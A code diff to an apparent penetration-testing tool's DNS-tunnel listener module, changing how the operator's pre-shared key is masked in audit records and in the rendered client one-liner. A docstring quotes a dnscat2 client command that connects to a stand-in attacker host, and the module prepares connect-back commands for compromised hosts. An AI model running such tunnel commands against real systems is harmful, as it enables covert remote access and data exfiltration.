@@ -58,6 +58,20 @@ CONTAINMENT, the rest of it:
     * Every start and stop is recorded via ``runstore.save_run``, with the operator's
       pre-shared tunnel password REDACTED — the audit trail must not become a key store.
 
+THE PRE-SHARED KEY IS MASKED AT SOURCE, NOT AT THE EDGE.
+    The key has to reach the server process, so :class:`ObfuscationListener` carries it. It is
+    kept out of everything else STRUCTURALLY: both the exported ``client_command`` and the
+    audited argv are BUILT from a :func:`_mask_secret` copy of the model, so the raw key is
+    never embedded in a rendered string in the first place. It lives in exactly two places —
+    the ``secret`` field, and the argv handed to ``subprocess`` — and nowhere else.
+
+    This replaces an earlier ``str.replace(secret, "***")`` pass at the HTTP layer, which had
+    two faults: it lived outside this module (so a new route that forgot to call it would
+    re-export the key inside ``client_command``), and it was over-broad (a short key mangled
+    unrelated characters, handing the operator a corrupt command). Masking by construction has
+    neither fault: the mask is placed where the key would have gone and touches nothing else,
+    and no caller can opt out of it.
+
 The far-side client connect-back is inherently untestable without a real compromised host;
 the listener lifecycle, the argv and the one-liner are built and unit-tested, and the actual
 connect-back is the operator's manual step, exactly like the pivot tunnels' agent line.
@@ -73,7 +87,7 @@ import threading
 import uuid
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
-from typing import Any
+from typing import Any, TypeVar
 
 from pydantic import BaseModel, Field, field_validator, model_validator
 
@@ -106,7 +120,18 @@ MAX_LIVE_LISTENERS = int(_os.environ.get("HACKPIT_MAX_DNS_LISTENERS", "2"))
 # cannot be read as a flag, and no whitespace/metacharacters to smuggle in.
 _ZONE_RE = re.compile(r"^(?!-)[A-Za-z0-9._<>-]{1,253}$")
 # A pre-shared password: anything printable except whitespace, again never leading '-'.
-_SECRET_RE = re.compile(r"^(?!-)[!-~]{1,128}$")
+#
+# MINIMUM 8. This is the key that authenticates every client to the operator's own tunnel
+# server; a one- or two-character pre-shared key is not a legitimate value for it, and the
+# bound is cheap to hold. (It is no longer load-bearing for redaction — see SECRET_MASK: the
+# masked forms are BUILT, not string-substituted, so a short key can no longer mangle the
+# rendered command. This bound exists on its own merits.)
+_SECRET_MIN_LEN = 8
+_SECRET_RE = re.compile(r"^(?!-)[!-~]{%d,128}$" % _SECRET_MIN_LEN)
+
+# What the operator's key is replaced BY, everywhere a key must not appear. A module constant
+# so the audit redaction, the exported one-liner and the tests all name the same thing.
+SECRET_MASK = "***"
 
 
 def _now() -> str:
@@ -191,7 +216,8 @@ class ObfuscationRequest(BaseModel):
             return None
         if not _SECRET_RE.match(v):
             raise ValueError(
-                "secret must be printable with no whitespace and may not start with '-'"
+                f"secret must be at least {_SECRET_MIN_LEN} printable characters with no "
+                "whitespace, and may not start with '-'"
             )
         return v
 
@@ -219,8 +245,9 @@ class ObfuscationListener(BaseModel):
     run_id: str
     client_command: str = Field(
         "",
-        description="The CLIENT half, for the operator to run BY HAND on the far side. "
-        "HackPit never delivers or executes it — see operator_oneliner.",
+        description="The CLIENT half, for the operator to run BY HAND on the far side, with "
+        "the pre-shared key already MASKED (the operator chose that key and substitutes it "
+        "themselves). HackPit never delivers or executes it — see operator_oneliner.",
     )
     setup_note: str = ""
     started_at: str
@@ -271,15 +298,41 @@ def _save(record: RunRecord) -> None:
         pass
 
 
-def _redacted(argv: list[str], secret: str | None) -> list[str]:
-    """``argv`` with the operator's pre-shared key masked. For the AUDIT RECORD only.
+# Either model that can carry the operator's key. Constrained (not bound) so the copy comes
+# back as the same type it went in as.
+_WithSecret = TypeVar("_WithSecret", ObfuscationRequest, ObfuscationListener)
+
+
+def _mask_secret(model: _WithSecret) -> _WithSecret:
+    """A COPY of ``model`` whose ``secret`` is :data:`SECRET_MASK`. *** THE MASKING PRIMITIVE. ***
+
+    Everything that must not carry the operator's key is BUILT from one of these copies rather
+    than string-substituted afterwards, and that distinction is the whole point:
+
+      * ``str.replace(secret, "***")`` is always over-broad. With a short or unlucky key it
+        eats every other occurrence of those characters — a 1-character key turned
+        ``dnscat2-client --secret=a attacker.example.com`` into
+        ``dnsc***t2-client --secret=*** ***tt***cker.ex***mple.com``. Fail-safe, but the
+        operator copies a corrupt command and the audit argv is mangled the same way.
+      * Building from a masked copy puts the mask exactly where the key would have gone,
+        structurally, and cannot touch anything else — whatever the key looks like.
+
+    Pure: returns a new model, mutates nothing. A model with no secret is returned as-is.
+    """
+    if not model.secret:
+        return model
+    return model.model_copy(update={"secret": SECRET_MASK})
+
+
+def _redacted(req: ObfuscationRequest) -> list[str]:
+    """The SERVER argv REBUILT with the key masked. For the AUDIT RECORD only.
 
     The real argv is what runs; this is what gets persisted. A run record ends up in the
-    engagement report and the runs DB, and neither should become a key store.
+    engagement report and the runs DB, and neither should become a key store. Note this is the
+    same pure builder the live argv comes from, run over a masked copy — not a substitution
+    pass over the live argv (see :func:`_mask_secret`).
     """
-    if not secret:
-        return list(argv)
-    return [t.replace(secret, "***") for t in argv]
+    return _server_args(_mask_secret(req))
 
 
 # --------------------------------------------------------------------------- #
@@ -317,6 +370,11 @@ def operator_oneliner(listener: ObfuscationListener) -> str:
 
     PURE: string construction only — no I/O, no clock, no subprocess, no state. Deterministic
     for a given listener, so the UI may call it freely.
+
+    IT RENDERS WHATEVER KEY THE LISTENER IT IS HANDED CARRIES — it is a formatter, not a
+    policy. :func:`start_listener` therefore hands it a :func:`_mask_secret` copy, so the
+    ``client_command`` stored on the listener (and thus every field that can cross an API
+    boundary) is masked BY CONSTRUCTION rather than by a caller remembering to scrub it.
     """
     if listener.kind == "dnscat2":
         parts = [DNSCAT2_CLIENT_BIN]
@@ -405,14 +463,20 @@ def start_listener(req: ObfuscationRequest) -> ObfuscationListener:
         started_at=started_at,
         engagement_id=req.engagement_id,
     )
-    # The one-liner has ONE source of truth, and it is the pure function.
-    model.client_command = operator_oneliner(model)
+    # The one-liner has ONE source of truth, and it is the pure function — fed a MASKED copy.
+    # *** THIS IS THE BOUNDARY, AND IT IS STRUCTURAL. *** The rendered client line is built
+    # from a listener whose secret is already SECRET_MASK, so the real key is never embedded in
+    # `client_command` at all. It therefore cannot leak through any route that returns this
+    # model, present or future, whether or not that route remembers to scrub anything. The real
+    # key goes to exactly one place: _server_args, i.e. the server process's own argv.
+    model.client_command = operator_oneliner(_mask_secret(model))
 
     record = RunRecord(
         run_id=run_id,
         command=server_args[0],
-        # REDACTED: the operator's tunnel password must not land in the audit trail.
-        args=_redacted(server_args[1:], req.secret),
+        # REDACTED: the operator's tunnel password must not land in the audit trail. Rebuilt
+        # from a masked copy, so a short key cannot mangle the rest of the argv.
+        args=_redacted(req)[1:],
         # No target BY DEFINITION — this is the operator's own box. Recording the container
         # keeps the audit row honest instead of naming a system under test that was never
         # touched.
